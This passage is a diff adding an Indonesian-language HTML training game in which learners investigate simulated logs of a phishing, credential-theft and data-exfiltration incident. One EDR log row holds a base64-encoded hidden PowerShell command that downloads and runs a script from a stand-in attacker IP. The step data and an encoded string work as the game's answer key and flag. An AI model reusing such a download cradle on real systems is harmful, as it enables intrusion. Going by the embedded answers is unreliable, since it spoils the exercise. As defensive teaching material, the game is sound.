@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cipher</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --nav:#2f343b; --nav2:#262b31; --navtx:#c3c9d0; --navac:#ffffff;
+    --accent:#2477c9; --accentd:#1b5e9e;
+    --green:#5a9e2f; --greenbg:#eef6e6;
+    --bg:#e9ecf0; --panel:#ffffff; --line:#d7dbe1; --line2:#edeff2;
+    --text:#2d3239; --muted:#6c7480; --head:#f4f5f7;
+    --sel:#dcecfb; --hover:#f1f7fd; --danger:#c0392b; --amber:#b9770e;
+    --sans:'Segoe UI',system-ui,-apple-system,Roboto,Arial,sans-serif;
+    --mono:'Consolas','SF Mono',Menlo,monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:13px;line-height:1.5}
+  #app{min-height:100vh}
+  a{color:var(--accent);text-decoration:none}
+
+  /* ---------- top nav ---------- */
+  .ent-nav{display:flex;align-items:center;background:var(--nav);color:var(--navtx);height:46px;padding:0 14px;gap:2px}
+  .ent-brand{display:flex;align-items:center;gap:9px;font-weight:600;color:#fff;padding-right:16px;white-space:nowrap}
+  .ent-brand .logo{width:20px;height:20px;border-radius:3px;background:linear-gradient(135deg,var(--accent),#39a0c9);display:inline-block}
+  .ent-brand small{font-weight:400;color:var(--navtx);font-size:11px}
+  .ent-tabs{display:flex;align-items:center;height:46px;overflow:hidden;flex:1 1 auto;min-width:0}
+  .ent-tab{padding:0 14px;height:46px;line-height:46px;color:var(--navtx);font-size:13px;cursor:default;white-space:nowrap}
+  .ent-tab.on{color:#fff;background:var(--nav2);box-shadow:inset 0 -2px 0 var(--accent)}
+  .ent-nav .spacer{flex:0 0 8px}
+  .ent-search,.ent-user,.ent-reset{flex:none}
+  .ent-search{background:var(--nav2);border:1px solid #3a4048;border-radius:3px;color:var(--navtx);font-size:12px;padding:5px 9px;width:170px}
+  .ent-search::placeholder{color:#7f868f}
+  .ent-reset{color:#fff;font-size:12px;border:1px solid #4a515a;border-radius:3px;padding:5px 11px;margin-left:12px;cursor:pointer;white-space:nowrap}
+  .ent-reset:hover{background:var(--nav2)}
+  .ent-reset.warn{background:var(--danger);border-color:var(--danger);color:#fff}
+  .ent-user{color:#fff;font-size:12px;padding-left:14px;white-space:nowrap}
+  .ent-user b{font-weight:600}
+
+  /* ---------- shell: sidebar + main ---------- */
+  .ent-shell{display:flex;min-height:calc(100vh, 46px)}
+  .ent-side{width:210px;background:#fbfbfc;border-right:1px solid var(--line);flex:none;padding:10px 0;font-size:12.5px}
+  .ent-side .grp{color:var(--muted);text-transform:uppercase;font-size:10.5px;letter-spacing:.4px;padding:12px 16px 5px}
+  .ent-side .it{padding:7px 16px;color:#41474f;cursor:default;border-left:3px solid transparent}
+  .ent-side .it.on{background:#eaf2fb;border-left-color:var(--accent);color:var(--accentd);font-weight:600}
+  .side-kv{display:flex;justify-content:space-between;padding:5px 16px;font-size:12px;color:#41474f}
+  .side-kv span{color:var(--muted)} .side-kv b{font-weight:600}
+  .side-kv .sev-h{color:#fff;background:var(--danger);font-size:10px;padding:1px 6px;border-radius:2px;letter-spacing:.4px}
+  .side-note{padding:4px 16px 8px;font-size:11.5px;color:var(--muted);line-height:1.5}
+  .ent-main{flex:1;min-width:0;padding:16px 20px 40px}
+  @media(max-width:920px){.ent-side{display:none} .ent-main{padding:12px}}
+  @media(max-width:820px){.ent-tabs{display:none} .ent-search{display:none}}
+
+  .ent-crumb{color:var(--muted);font-size:12px;margin-bottom:4px}
+  .ent-title{font-size:20px;font-weight:600;margin:0 0 14px;color:#23272d}
+
+  /* ---------- toolbar / tabs ---------- */
+  .ent-toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:0}
+  .ent-toolbar .lbl{color:var(--muted);font-size:12px;margin-right:2px}
+  .logtabs{display:flex;gap:0;flex-wrap:wrap}
+  .logtab{padding:7px 15px;font-size:12.5px;cursor:pointer;border:1px solid var(--line);border-right:none;background:#f7f8fa;color:#41474f}
+  .logtab:first-child{border-radius:3px 0 0 3px}
+  .logtab:last-child{border-right:1px solid var(--line);border-radius:0 3px 3px 0}
+  .logtab:hover{background:#eef1f5}
+  .logtab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+  .ent-toolbar .rt{margin-left:auto;display:flex;align-items:center;gap:8px;color:var(--muted);font-size:12px}
+  .fakebtn{border:1px solid var(--line);background:#fff;border-radius:3px;padding:6px 10px;color:#41474f;font-size:12px}
+
+  .logmeta{display:flex;justify-content:space-between;align-items:center;padding:8px 2px;color:var(--muted);font-size:12px}
+  .logmeta .name{font-family:var(--mono);color:#41474f}
+  .logmeta .cnt{font-size:11.5px}
+
+  /* ---------- table ---------- */
+  .logbox{border:1px solid var(--line);background:var(--panel);overflow-x:auto}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  thead th{text-align:left;padding:9px 12px;color:#41474f;font-weight:600;background:var(--head);
+    border-bottom:1px solid var(--line);white-space:nowrap;font-size:12px}
+  thead th .caret{color:#aab0b8;font-size:9px;margin-left:4px}
+  thead th.sortable{cursor:pointer;user-select:none}
+  thead th.sortable:hover{background:#eceef1}
+  thead th.on{color:var(--accentd)} thead th.on .caret{color:var(--accent)}
+  tbody td{padding:8px 12px;border-bottom:1px solid var(--line2);white-space:nowrap;color:#3a3f46}
+  tbody td.cbx{width:34px;padding-left:12px;padding-right:0}
+  thead th.cbx{width:34px}
+  .cb{display:inline-block;width:14px;height:14px;border:1px solid #b6bcc4;border-radius:2px;background:#fff;vertical-align:middle;position:relative}
+  tbody tr.click{cursor:pointer}
+  tbody tr.click:hover{background:var(--hover)}
+  tbody tr.selected{background:var(--sel)}
+  tbody tr.selected .cb{background:var(--accent);border-color:var(--accent)}
+  tbody tr.selected .cb::after{content:"";position:absolute;left:4px;top:1px;width:4px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
+  tbody tr.selected td:first-child{box-shadow:inset 3px 0 0 var(--accent)}
+  tbody tr.ro .cb{opacity:.35}
+  tbody tr:last-child td{border-bottom:none}
+  tbody tr.wrong{background:#fbe7e4;animation:flash .4s}
+  @keyframes flash{0%{background:#f6cfc9}100%{background:#fbe7e4}}
+  @media(prefers-reduced-motion:reduce){tbody tr.wrong{animation:none}}
+
+  /* ---------- incident workbench (questions) ---------- */
+  .wb{margin-top:16px;border:1px solid var(--line);background:var(--panel)}
+  .wb-head{display:flex;align-items:center;gap:10px;background:var(--nav);color:#fff;padding:9px 14px;font-size:12.5px;font-weight:600}
+  .wb-head .dot{width:8px;height:8px;border-radius:50%;background:var(--danger);box-shadow:0 0 0 3px rgba(192,57,43,.25)}
+  .wb-head .prog{margin-left:auto;display:flex;align-items:center;gap:8px;font-weight:400;color:var(--navtx);font-family:var(--mono);font-size:11.5px}
+  .bar{width:110px;height:6px;background:#454b53;border-radius:3px;overflow:hidden}
+  .bar>span{display:block;height:100%;width:0;background:var(--accent);transition:width .4s}
+  .wb-body{padding:16px 16px 18px}
+  .qcount{color:var(--muted);font-size:11px;font-family:var(--mono);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
+  .qcount b{color:var(--accentd)}
+  .task{border-left:3px solid var(--accent);background:#f7fafd;padding:12px 15px;margin-bottom:14px}
+  .task h2{font-size:15px;margin:0 0 5px;color:#23272d;font-weight:600}
+  .task p{margin:0;color:#41474f;font-size:13.5px}
+  .unlock{background:#fff8e8;border:1px solid #f0dca6;color:#8a6516;padding:8px 12px;font-size:12.5px;margin-bottom:12px}
+
+  .verdict-opts{display:flex;flex-direction:column;gap:8px;margin:0 0 14px;max-width:520px}
+  .vopt{font-family:var(--sans);font-size:13.5px;cursor:pointer;border:1px solid var(--line);background:#fff;color:var(--text);padding:11px 14px;text-align:left;display:flex;align-items:center;gap:10px}
+  .vopt::before{content:"";width:14px;height:14px;border:1px solid #b6bcc4;border-radius:50%;flex:none}
+  .vopt:hover{background:var(--hover)}
+  .vopt.sel{border-color:var(--accent);background:var(--sel)}
+  .vopt.sel::before{border:4px solid var(--accent);background:#fff}
+
+  .answerbar{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+  .answerbar .selinfo{color:var(--muted);font-size:12.5px}
+  .ans-row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+  .ans-input{flex:1;min-width:220px;border:1px solid var(--line);border-radius:3px;padding:9px 11px;font-family:var(--mono);font-size:13px;color:var(--text)}
+  .ans-input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 2px rgba(36,119,201,.18)}
+  .cc-link{font-size:12px;color:var(--accent);white-space:nowrap;border:1px solid var(--line);border-radius:3px;padding:8px 11px}
+  .cc-link:hover{background:var(--hover)}
+  .btn{font-family:var(--sans);font-weight:600;font-size:13px;cursor:pointer;border:1px solid var(--accentd);
+    background:var(--accent);color:#fff;border-radius:3px;padding:8px 18px}
+  .btn:hover{background:var(--accentd)}
+  .btn:disabled{background:#b8c4d0;border-color:#b8c4d0;cursor:not-allowed}
+  .btn.ghost{background:#fff;color:#41474f;border:1px solid var(--line)}
+  .btn.ghost:hover{background:#f1f3f6}
+  .btn:focus-visible,tr:focus-visible,.vopt:focus-visible{outline:2px solid var(--accent);outline-offset:1px}
+
+  .feedback{margin-top:14px;padding:13px 15px;font-size:13.5px;display:none;border:1px solid var(--line)}
+  .feedback.show{display:block}
+  .feedback.good{background:var(--greenbg);border-color:#c3e0a8}
+  .feedback.nudge{background:#fdf3e3;border-color:#f0dca6}
+  .feedback h3{font-size:13.5px;margin:0 0 6px;font-weight:700}
+  .feedback.good h3{color:#3f7a1f} .feedback.nudge h3{color:#8a6516}
+  .feedback p{margin:0 0 10px} .feedback p:last-child{margin:0}
+  .feedback code{font-family:var(--mono);background:#eef1f4;padding:1px 5px;border-radius:2px;font-size:.92em}
+  .next-row{margin-top:12px;display:flex;justify-content:flex-end}
+  code{font-family:var(--mono)}
+
+  /* ---------- login ---------- */
+  .login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;
+    background:linear-gradient(180deg,#2f343b 0,#262b31 100%);padding:20px}
+  .login-card{width:400px;max-width:100%;background:#fff;border-radius:4px;box-shadow:0 10px 40px rgba(0,0,0,.35);overflow:hidden}
+  .login-top{background:var(--nav);color:#fff;padding:18px 24px;display:flex;align-items:center;gap:10px}
+  .login-top .logo{width:24px;height:24px;border-radius:3px;background:linear-gradient(135deg,var(--accent),#39a0c9)}
+  .login-top b{font-size:15px} .login-top small{display:block;color:var(--navtx);font-size:11px;font-weight:400}
+  .login-body{padding:24px}
+  .login-body h1{font-size:16px;margin:0 0 4px;color:#23272d}
+  .login-body .sub{color:var(--muted);font-size:12.5px;margin:0 0 20px}
+  .field{margin-bottom:14px}
+  .field label{display:block;font-size:11.5px;color:#41474f;margin-bottom:5px;font-weight:600}
+  .field input{width:100%;border:1px solid var(--line);border-radius:3px;padding:9px 11px;font-size:13.5px;font-family:var(--sans);color:var(--text)}
+  .field input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 2px rgba(36,119,201,.18)}
+  .login-body .btn{width:100%;justify-content:center;padding:10px}
+  .boot{font-family:var(--mono);font-size:11.5px;color:var(--green);margin-top:12px;min-height:16px}
+  .login-foot{background:#f4f5f7;border-top:1px solid var(--line);padding:11px 24px;color:var(--muted);font-size:11px;text-align:center}
+
+  /* ---------- briefing / conclusion cards ---------- */
+  .card{background:#fff;border:1px solid var(--line);max-width:820px}
+  .card-head{background:var(--head);border-bottom:1px solid var(--line);padding:11px 16px;font-weight:600;color:#23272d;display:flex;align-items:center;gap:10px}
+  .card-head .sev{font-size:10.5px;font-weight:700;color:#fff;background:var(--danger);padding:2px 7px;border-radius:2px;letter-spacing:.4px}
+  .card-body{padding:18px 20px}
+  .kv{display:flex;gap:10px;padding:6px 0;font-size:13px;border-bottom:1px solid var(--line2)}
+  .kv:last-of-type{border-bottom:none}
+  .kv .k{width:120px;color:var(--muted);flex:none;font-size:12px}
+  .lede{color:#3a3f46;font-size:13.5px;margin:0 0 16px;line-height:1.6}
+  .tl{display:flex;gap:14px;padding:9px 0;border-bottom:1px solid var(--line2);font-size:13px}
+  .tl:last-child{border-bottom:none}
+  .tl .t{font-family:var(--mono);color:var(--accentd);min-width:52px;font-size:12.5px}
+  .verdict-box{background:var(--head);border:1px solid var(--line);padding:16px;text-align:center;margin-top:14px}
+  .verdict-box .rank{font-size:20px;font-weight:700;color:#23272d;margin:4px 0}
+  .badge-ok{display:inline-flex;align-items:center;gap:5px;color:var(--green);font-weight:600}
+  .badge-ok::before{content:"\2713";font-weight:700}
+  .sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+/* ============================================================
+   DATA LOG  (ditempel langsung, WAJIB agar bisa dibuka lewat
+   double-click file, tanpa server. Jangan pindah ke CSV terpisah.)
+   ============================================================ */
+const EMAIL = {
+  cols:["timestamp","recipient","sender","status","subject"],
+  rows:[
+    {id:"e1", cells:["08:12","andi@cipher.com","gita@cipher.com","Delivered","Laporan mingguan Q2"]},
+    {id:"e2", cells:["08:20","bella@cipher.com","hadi@cipher.com","Delivered","Jadwal meeting 10:00"]},
+    {id:"e3", cells:["08:55","joko@cipher.com","lina@cipher.com","Delivered","Revisi budget Q2"]},
+    {id:"p1", cells:["09:00","andi@cipher.com","it-support@cipher-secure.com","Link clicked","Notifikasi Reset Password"]},
+    {id:"p2", cells:["09:00","bella@cipher.com","it-support@cipher-secure.com","Opened","Notifikasi Reset Password"]},
+    {id:"p3", cells:["09:00","citra@cipher.com","it-support@cipher-secure.com","Deleted","Notifikasi Reset Password"]},
+    {id:"p4", cells:["09:05","dodi.admin@cipher.com","it-support@cipher-secure.com","Opened","Notifikasi Reset Password"]},
+    {id:"e5", cells:["09:18","indah@cipher.com","kiki@cipher.com","Delivered","Approval cuti"]},
+    {id:"e6", cells:["09:32","eka@cipher.com","supplier@vendor.co.id","Delivered","Invoice #2231"]},
+  ]
+};
+const AUTH = {
+  cols:["timestamp","account","source_ip","location","result"],
+  rows:[
+    {id:"a1", cells:["07:52","andi","10.4.2.11","Jakarta, ID (kantor)","Success"]},
+    {id:"a2", cells:["08:01","bella","114.5.8.22","Semarang, ID (WFH)","Success"]},
+    {id:"a3", cells:["08:07","citra","10.4.2.7","Jakarta, ID (kantor)","Success"]},
+    {id:"a4", cells:["08:29","gita","36.71.14.9","Makassar, ID (WFH)","Success"]},
+    {id:"a5", cells:["09:15","dodi.admin","10.4.2.3","Jakarta, ID (kantor)","Success"]},
+    {id:"andiF", cells:["09:40","andi","203.0.113.77","Minsk, BY","Success"]},
+    {id:"bella2",cells:["09:41","bella","114.5.8.22","Semarang, ID (WFH)","Success"]},
+    {id:"a6", cells:["10:05","joko","10.4.2.5","Jakarta, ID (kantor)","Success"]},
+    {id:"dodiF", cells:["10:25","dodi.admin","203.0.113.77","Minsk, BY","Success"]},
+    {id:"a7", cells:["11:04","lina","180.243.2.40","Samarinda, ID (WFH)","Success"]},
+  ]
+};
+const PROCESS = {
+  cols:["timestamp","host","process","event"],
+  rows:[
+    {id:"r1", cells:["08:30","PC-ANDI","explorer.exe","Process started"]},
+    {id:"r2", cells:["08:31","PC-ANDI","outlook.exe","Process started"]},
+    {id:"r3", cells:["08:33","PC-ANDI","chrome.exe","Process started"]},
+    {id:"r4", cells:["09:12","PC-ANDI","excel.exe","Process started"]},
+    {id:"r5", cells:["09:44","PC-ANDI","chrome.exe","Outbound connection"]},
+    {id:"m1", cells:["09:55","PC-ANDI","svch0st.exe","File written to \\Users\\andi\\Downloads"]},
+    {id:"m2", cells:["09:56","PC-ANDI","svch0st.exe","Process executed"]},
+    {id:"m3", cells:["09:58","PC-ANDI","svch0st.exe","Outbound connection \u2192 203.0.113.77"]},
+  ]
+};
+const EDR = {
+  cols:["timestamp","host","process","sha256","cmdline"],
+  rows:[
+    {id:"d1", cells:["08:33","PC-ANDI","explorer.exe","1c467339c960a107ab9ee5ff63b38009797416c964f988b224710773cc38796a","C:\\Windows\\explorer.exe"]},
+    {id:"d2", cells:["08:35","PC-ANDI","chrome.exe","9390ef32addf32bfdea786bc1e20679592498068bcbfcd357ea10ab64ea35e47","chrome.exe --restore-last-session"]},
+    {id:"d3", cells:["08:41","PC-BELLA","outlook.exe","4f53c6c301f98610918a5418c65988fab5fd03f9d217902bff2f03c2daef56b4","outlook.exe /recycle"]},
+    {id:"mal1",cells:["09:56","PC-ANDI","svch0st.exe","461dfe12ee72f92e50ef14ee222175b2b28af761e818a9d6a8e9cfe29b54c3f1","C:\\Users\\andi\\Downloads\\svch0st.exe"]},
+    {id:"enc1",cells:["09:59","PC-ANDI","powershell.exe","86f51b17077aee2d7885528286a00aa632489cfee188cc99fbec881feb06dca7","powershell -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8yMDMuMC4xMTMuNzcvdXBkYXRlLnBzMScp"]},
+    {id:"mal2",cells:["10:26","PC-DODI","sys_update.exe","461dfe12ee72f92e50ef14ee222175b2b28af761e818a9d6a8e9cfe29b54c3f1","C:\\ProgramData\\sys_update.exe /silent"]},
+    {id:"enc2",cells:["10:30","PC-DODI","wscript.exe","b79856260b3cc9b3e958c83a55bae1e46e31d232125b925c581022786a7bc042","wscript.exe /b //e:jscript NDM0OTUwNDg0NTUyN2I2YzMwNjc3MzVmNjQzMDZlNzQ1ZjY2MzA3MjY3MzM3NDdk"]},
+  ]
+};
+const FILEACC = {
+  cols:["event_id","timestamp","account","action","object","source_ip"],
+  rows:[
+    {id:"g1", cells:["5001","08:40","andi","READ","laporan_mingguan.xlsx","10.4.2.11"]},
+    {id:"g2", cells:["5002","09:05","gita","READ","budget_q2.xlsx","36.71.14.9"]},
+    {id:"g3", cells:["5003","09:20","citra","READ","sop_gudang.pdf","10.4.2.7"]},
+    {id:"g4", cells:["5004","09:50","lina","MODIFY","presentasi_klien.pptx","180.243.2.40"]},
+    {id:"g5", cells:["5005","10:10","joko","READ","kontrak_vendor.pdf","10.4.2.5"]},
+    {id:"fx1",cells:["5006","10:28","dodi.admin","EXPORT","customer_database.csv","203.0.113.77"]},
+    {id:"fx2",cells:["5007","10:34","dodi.admin","DELETE","finance_records_2026.xlsx","203.0.113.77"]},
+    {id:"g6", cells:["5008","10:38","indah","READ","memo_internal.docx","10.4.2.22"]},
+    {id:"fgap",cells:["5013","10:47","eka","READ","invoice_2231.pdf","36.71.9.4"]},
+  ]
+};
+
+/* ============================================================
+   ALUR INVESTIGASI, 6 langkah + kesimpulan.
+   Menambah Level 2 nanti = tinggal push objek ke array ini.
+   ============================================================ */
+const STEPS = [
+  {
+    table:EMAIL, hintCol:"sender",
+    title:"Email palsu masuk", ico:"✉",
+    mission:"Empat karyawan menerima email yang mengaku dari “tim IT”. Dari sinilah semuanya bermula. Apa yang terjadi, adakah yang mencurigakan?",
+    mode:"any", targets:["p1","p2","p3","p4"],
+    hint:"Perhatikan baik-baik alamat <b>pengirim</b> tiap email. Adakah yang tidak seperti alamat resmi perusahaan?",
+    good:{title:"Domain palsu ketahuan!",
+      body:`Pengirim asli Perusahaan Cipher memakai <code>@cipher.com</code>. Email ini datang dari <code>@cipher-secure.com</code>, domain tiruan yang dibuat penyerang. Ini yang disebut <b>phishing</b>.`},
+    decoy:{def:"Itu email internal biasa. Perhatikan lagi alamat pengirimnya baik-baik."}
+  },
+  {
+    table:EMAIL, hintCol:"status",
+    title:"Siapa yang tertipu?", ico:"🎣",
+    mission:"Menerima email jebakan bukan berarti langsung jadi korban. Siapa yang benar-benar <b>terpancing</b> sampai mengeklik tautannya?",
+    mode:"any", targets:["p1"],
+    hint:"Bandingkan kolom <b>status</b> dari keempat penerima email jebakan. Siapa yang tindakannya paling jauh?",
+    good:{title:"Korban teridentifikasi: Andi",
+      body:`Hanya <b>Andi</b> yang <code>Link clicked</code>, mengeklik tautan lalu dibawa ke halaman palsu dan menyerahkan password. Bella & Dodi hanya membuka link tetapi tidak mengisi kredensial, jadi tidak terpancing lewat phishing.`},
+    decoy:{p2:"Bella <code>Opened</code>, membuka saja, tidak mengeklik. Tidak terpancing.",
+           p3:"Citra <code>Deleted</code>, dihapus tanpa diklik. Aman.",
+           p4:"Dodi hanya <code>Opened</code> email ini, dia tidak mengeklik tautannya, jadi tidak terpancing lewat phishing.",
+           def:"Bandingkan tindakan tiap penerima di kolom status. Siapa yang paling jauh, sampai mengeklik?"}
+  },
+  {
+    table:AUTH, hintCol:"location",
+    title:"Jejak akun Andi", ico:"🌍",
+    mission:"Berarti kredensial <b>Andi</b> sudah dicuri. Apa yang membuktikan hacker tersebut meretas akun Andi? Kira-kira apa yang pertama dilakukan attacker?",
+    mode:"any", targets:["andiF"],
+    hint:"Lihat semua baris milik akun <b>andi</b>. Adakah dua lokasi yang mustahil dicapai dalam waktu sesingkat itu?",
+    good:{title:"Login yang mustahil!",
+      body:`Jam 07:52 Andi login dari <b>Jakarta</b>. Tapi jam 09:40 akun yang sama masuk dari <b>Minsk, Belarus</b> (<code>203.0.113.77</code>), mustahil berpindah sejauh itu dalam 2 jam. Ini penyerang memakai password curian Andi. Ingat IP ini: <code>203.0.113.77</code>.`},
+    decoy:{dodiF:"Insting bagus, baris ini juga dari luar negeri (Minsk). Tapi akunnya <b>dodi.admin</b>, bukan andi. Ingat baris ini, nanti kita periksa. Sekarang fokus ke akun <b>andi</b>.",
+           m1:"Program itu bukti komputer Andi terinfeksi, itu dibahas nanti. Yang membuktikan kredensialnya dicuri adalah jejak akun Andi dipakai orang lain.",
+           m2:"Program itu bukti komputer Andi terinfeksi, itu dibahas nanti. Yang membuktikan kredensialnya dicuri adalah jejak akun Andi dipakai orang lain.",
+           m3:"Program itu bukti komputer Andi terinfeksi, itu dibahas nanti. Yang membuktikan kredensialnya dicuri adalah jejak akun Andi dipakai orang lain.",
+           def:"Belum tentu. Banyak karyawan memang WFH dari luar Jakarta, lokasi berbeda saja belum cukup jadi bukti. Cari sesi login akun <b>andi</b> yang tak masuk akal dengan sesi lainnya."}
+  },
+  {
+    type:"verdict",
+    title:"Bagaimana dengan Bella?", ico:"⚠",
+    mission:"Bella termasuk yang menerima email phishing itu, dan sempat login tak lama setelahnya. Berdasarkan bukti di log, apakah Bella ikut menjadi korban serangan?",
+    options:["Ya, Bella ikut jadi korban","Tidak, Bella aman"],
+    correct:1,
+    wrongMsg:"Coba periksa lagi buktinya sebelum memutuskan: apa yang Bella lakukan dengan emailnya, dan apakah login-nya menyimpang dari kebiasaannya sehari-hari?",
+    good:{title:"Benar, Bella aman",
+      body:`Dua bukti sama-sama membebaskan Bella. Di email, statusnya hanya <code>Opened</code>, dia tidak mengeklik tautan seperti Andi. Dan login-nya (<code>114.5.8.22</code>, <b>Semarang</b>) sama persis dengan kebiasaan WFH-nya. Waktunya kebetulan mepet, itu saja. <b>Pelajaran:</b> nilai tiap akun dari <b>kebiasaannya sendiri</b>, dan cocokkan lebih dari satu bukti sebelum menuduh.`}
+  },
+  {
+    table:PROCESS, hintCol:"process",
+    title:"Di dalam komputer Andi", ico:"🐛",
+    mission:"Setelah akun Andi dikuasai, apa yang berjalan di komputernya (PC-ANDI)? Adakah yang tidak semestinya ada?",
+    mode:"any", targets:["m1","m2","m3"],
+    hint:"Sebagian besar proses di sini program biasa. Cari nama yang <b>mirip</b> program Windows tapi ada yang ganjil kalau dieja pelan-pelan.",
+    good:{title:"Malware ketemu: svch0st.exe",
+      body:`Program Windows asli bernama <code>svchost.exe</code>. Yang ini <code>svch0st.exe</code>, huruf “o” diganti <b>angka 0</b>. Trik penyamaran klasik. Jam 09:58 program ini membuka <code>Outbound connection → 203.0.113.77</code>, <b>IP yang sama</b> dengan penyerang tadi.`},
+    decoy:{def:"explorer, outlook, chrome, excel itu program normal. Eja pelan-pelan tiap nama, mana yang mirip tapi tidak persis dengan program Windows asli?"}
+  },
+  {
+    table:AUTH, hintCol:"account", keepFound:["andiF"], keepCleared:["bella2"],
+    title:"Penyerang naik level", ico:"🔓",
+    mission:"Serangan jarang berhenti di satu akun. Apakah penyerang juga menyentuh akun lain?",
+    mode:"any", targets:["dodiF"],
+    hint:"Akun Andi diakses dari satu sumber asing (<code>203.0.113.77</code>). Cari akun <b>lain</b> yang diakses dari sumber yang persis sama.",
+    good:{title:"Akun admin IT dikuasai!",
+      body:`Jam 10:25, <code>203.0.113.77</code> (Minsk) login lagi, kali ini ke akun <b>dodi.admin</b> (admin IT). Padahal Dodi tidak pernah mengeklik phishing; penyerang memanfaatkan pijakan di komputer Andi (lewat malware tadi) untuk meraih akun admin ini. Inilah <b>lateral movement</b>: loncat dari satu akun ke akun lain <b>tanpa</b> memancing korban baru. Dampaknya jauh lebih besar.`},
+    decoy:{andiF:"Itu akun Andi, korban pertama. Cari akun <b>lain</b> dengan sumber yang sama.",
+           def:"Cari baris dengan IP <code>203.0.113.77</code> tapi akunnya bukan andi."}
+  },
+
+  /* ===================== LEVEL 2, dampak serangan ===================== */
+  {
+    table:FILEACC, level:2, hintCol:"action",
+    title:"Apa yang mereka ambil?", ico:"📤",
+    mission:"Penyerang kini memegang akun admin. Dengan akses itu, apa yang mereka bawa keluar dari sistem?",
+    mode:"any", targets:["fx1"],
+    hint:"Kamu sudah tahu akun & IP penyerang dari sebelumnya. Cari tindakan yang <b>mengeluarkan</b> data oleh akun itu.",
+    good:{title:"Data pelanggan bocor",
+      body:`Jam 10:28, <b>dodi.admin</b> dari <code>203.0.113.77</code> (Minsk) meng-<code>EXPORT</code> <code>customer_database.csv</code> keluar sistem. Inilah kebocorannya: seluruh data pelanggan Perusahaan Cipher kini di tangan penyerang.`},
+    decoy:{fx2:"Itu berkas yang <b>dihancurkan</b>, bukan yang dibawa keluar.",
+           def:"Itu akses berkas normal oleh karyawan dari lokasi biasa. Cari tindakan yang mengeluarkan data oleh akun yang sudah dibajak."}
+  },
+  {
+    type:"verdict", level:2,
+    title:"Seberapa parah?", ico:"💥",
+    mission:"Penyerang sudah meng-EXPORT database pelanggan keluar dan menghapus catatan keuangan. Menurutmu, apa dampaknya bagi perusahaan?",
+    options:["Tidak ada dampak serius, cukup ganti password","Data pelanggan bocor ke luar &amp; catatan keuangan hilang, kerugian besar","Hanya satu komputer yang melambat","Hanya email internal yang terganggu"],
+    correct:1,
+    wrongMsg:"Pikirkan lagi: data seluruh pelanggan kini di tangan penyerang, dan catatan keuangan sudah dihapus. Seberapa besar itu bagi perusahaan?",
+    good:{title:"Dampak: kebocoran data & kerusakan",
+      body:`Betul. Meng-EXPORT <code>customer_database.csv</code> berarti <b>data pribadi seluruh pelanggan</b> kini di tangan penyerang, pelanggaran data yang serius (hukum, reputasi, kepercayaan). Ditambah <code>finance_records_2026.xlsx</code> yang dihapus, perusahaan kehilangan data penting sekaligus. Inilah kenapa lateral movement ke akun admin tadi begitu berbahaya.`}
+  },
+  {
+    table:FILEACC, level:2,
+    title:"Catatan yang hilang", ico:"🧹",
+    mission:"Nomor urut seharusnya naik satu per satu. Tapi di satu titik ia melompat, tanda ada catatan yang dihapus. Temukan titik itu, lalu klik <b>dua baris</b> yang mengapitnya (tepat sebelum dan sesudah lompatan).",
+    mode:"all", targets:["g6","fgap"],
+    good:{title:"Celah nomor urut terbongkar",
+      body:`Kamu menangkap yang paling halus. Kedua baris ini bersebelahan, tapi nomor <code>event_id</code>-nya melompat dari <code>5008</code> ke <code>5013</code>, empat catatan (5009-5012) <b>hilang</b> di antaranya. Dan ya: penyerang yang memegang akun admin memang <b>bisa</b> menghapus entri log, menghapus jejak adalah langkah serangan yang umum. Tapi log yang baik <b>tahan-utak-atik</b>: nomor urut diberikan saat entri ditulis, dan penyerang tak bisa menambalnya kembali, jadi celah nomor inilah yang membongkar penghapusan. Penyerang ini pun ceroboh: EXPORT &amp; DELETE mereka sendiri (5006-5007) malah tak terhapus. <b>Pelajaran nyata:</b> simpan log di tempat terpisah yang tak bisa diubah (server pusat/SIEM), supaya bahkan penghapusan pun ketahuan.`},
+    decoy:{fx1:"Itu tindakan penyerang yang tercatat, bukan titik di mana urutan nomornya terputus.",
+           fx2:"Itu tindakan penyerang yang tercatat, bukan titik di mana urutan nomornya terputus.",
+           def:"Baris itu nomornya masih menyambung dengan tetangganya. Telusuri kolom <code>event_id</code>, di mana angkanya melompat?"}
+  },
+];
+
+/* ============================================================
+   ENGINE
+   ============================================================ */
+const app = document.getElementById('app');
+
+const LOGS = {
+  email:   {name:"Email",        short:"win_mail_gateway.log",  table:EMAIL},
+  auth:    {name:"Authentication",short:"auth_signin.log",      table:AUTH},
+  process: {name:"Process",      short:"edr_process.log",       table:PROCESS},
+  file:    {name:"File Access",  short:"dlp_fileaccess.log",     table:FILEACC},
+  edr:     {name:"EDR",          short:"edr_detections.log",     table:EDR},
+};
+const BASE_KEYS = ['email','auth','process','file'];
+const ALL_KEYS = ['email','auth','process','file','edr'];
+let logOrder = BASE_KEYS.slice();
+function shuffleLogs(){
+  logOrder = BASE_KEYS.slice();
+  for(let i=logOrder.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1)); const t=logOrder[i]; logOrder[i]=logOrder[j]; logOrder[j]=t; }
+}
